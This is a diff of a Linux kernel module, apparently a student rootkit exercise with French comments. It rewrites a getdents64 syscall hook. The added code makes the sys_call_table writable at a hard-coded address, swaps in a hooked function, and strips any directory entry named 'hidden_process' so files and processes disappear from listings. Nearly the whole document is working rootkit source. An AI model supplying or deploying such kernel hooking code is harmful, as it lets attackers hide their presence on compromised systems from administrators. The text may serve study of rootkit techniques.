@@ -5,68 +5,105 @@
 #include <linux/dirent.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
-#include <linux/version.h>
-#include <linux/string.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez");
-MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré");
+MODULE_AUTHOR("Rootkit Exercise");
+MODULE_DESCRIPTION("Rootkit with getdents64 hooking");
 
-static unsigned long *syscall_table = NULL;
-static unsigned long (*my_kallsyms_lookup_name)(const char *name) = NULL;
+// Adresse statique de sys_call_table
+unsigned long sys_call_table = 0xffffffffa5200320;
 
-asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);
+// Pointeurs pour stocker les adresses des fonctions d'origine
+asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
 
+// Fonctions pour rendre la mémoire en lecture/écriture et lecture seule
+void make_rw(unsigned long address) {
+    unsigned int level;
+    pte_t *pte = lookup_address(address, &level);
+    if (pte->pte & ~_PAGE_RW)
+        pte->pte |= _PAGE_RW;
+}
+
+void make_ro(unsigned long address) {
+    unsigned int level;
+    pte_t *pte = lookup_address(address, &level);
+    pte->pte = pte->pte & ~_PAGE_RW;
+}
+
+// Fonction hookée pour getdents64
+asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
+    int nread;
+    struct linux_dirent64 *kdirent, *current_dir, *prev = NULL;
+    unsigned long offset = 0;
+
+    nread = original_getdents64(fd, dirp, count);
+    if (nread <= 0)
+        return nread;
+
+    kdirent = kzalloc(nread, GFP_KERNEL);
+    if (!kdirent)
+        return nread;
+
+    if (copy_from_user(kdirent, dirp, nread)) {
+        kfree(kdirent);
+        return nread;
+    }
+
+    while (offset < nread) {
+        current_dir = (struct linux_dirent64 *)((char *)kdirent + offset);
+        if (strstr(current_dir->d_name, "hidden_process")) {
+            if (prev)
+                prev->d_reclen += current_dir->d_reclen;
+            else
+                memmove(current_dir, (char *)current_dir + current_dir->d_reclen, nread - offset - current_dir->d_reclen);
+            nread -= current_dir->d_reclen;
+        } else {
+            prev = current_dir;
+        }
+        offset += current_dir->d_reclen;
+    }
+
+    if (copy_to_user(dirp, kdirent, nread)) {
+        kfree(kdirent);
+        return nread;
+    }
+
+    kfree(kdirent);
+    return nread;
+}
+
+// Initialisation du module
 static int __init rootkit_init(void) {
-    unsigned long cr0;
-
     printk(KERN_INFO "rootkit_init : Début\n");
 
-    // Utilisation de l'adresse statique pour kallsyms_lookup_name
-    my_kallsyms_lookup_name = (unsigned long (*)(const char *))0xffffffffa419fd90;
-    if (!my_kallsyms_lookup_name) {
-        printk(KERN_ALERT "Erreur : kallsyms_lookup_name non définie\n");
-        return -1;
-    }
-    printk(KERN_INFO "kallsyms_lookup_name trouvé : %p\n", my_kallsyms_lookup_name);
+    // Rendre la mémoire de sys_call_table en lecture/écriture
+    make_rw(sys_call_table);
 
-    // Utilisation de l'adresse statique pour sys_call_table
-    syscall_table = (unsigned long *)0xffffffffa5200320;
-    if (!syscall_table || !access_ok((void *)syscall_table, sizeof(unsigned long))) {
-        printk(KERN_ALERT "Erreur critique : sys_call_table introuvable ou inaccessible : %p\n", syscall_table);
-        return -1;
-    }
-    printk(KERN_INFO "sys_call_table trouvée : %p\n", syscall_table);
+    // Sauvegarder la fonction originale et injecter la fonction hookée
+    original_getdents64 = (void *)((unsigned long *)sys_call_table)[__NR_getdents64];
+    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)hooked_getdents64;
 
-    // Validation de l'entrée dans la sys_call_table
-    if (!access_ok((void *)syscall_table[__NR_getdents64], sizeof(unsigned long))) {
-        printk(KERN_ALERT "Erreur : Entrée sys_call_table[__NR_getdents64] invalide\n");
-        return -1;
-    }
-    printk(KERN_INFO "Entrée sys_call_table[__NR_getdents64] valide : %p\n", (void *)syscall_table[__NR_getdents64]);
+    // Rendre la mémoire de sys_call_table en lecture seule
+    make_ro(sys_call_table);
 
-    // Hook de getdents64
-    cr0 = read_cr0();
-    write_cr0(cr0 & ~0x10000);
-    original_getdents = (void *)syscall_table[__NR_getdents64];
-    syscall_table[__NR_getdents64] = (unsigned long)NULL; // Exemple d'injection temporaire
-    write_cr0(cr0);
-
-    printk(KERN_INFO "rootkit_init : Fin\n");
+    printk(KERN_INFO "rootkit_init : Terminé\n");
     return 0;
 }
 
+// Déchargement du module
 static void __exit rootkit_exit(void) {
-    unsigned long cr0;
-
     printk(KERN_INFO "rootkit_exit : Début\n");
 
-    cr0 = read_cr0();
-    write_cr0(cr0 & ~0x10000);
-    syscall_table[__NR_getdents64] = (unsigned long)original_getdents;
-    write_cr0(cr0);
+    // Rendre la mémoire de sys_call_table en lecture/écriture
+    make_rw(sys_call_table);
 
-    printk(KERN_INFO "Rootkit déchargé\n");
+    // Restaurer la fonction originale
+    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)original_getdents64;
+
+    // Rendre la mémoire de sys_call_table en lecture seule
+    make_ro(sys_call_table);
+
+    printk(KERN_INFO "rootkit_exit : Module déchargé\n");
 }
 
 module_init(rootkit_init);
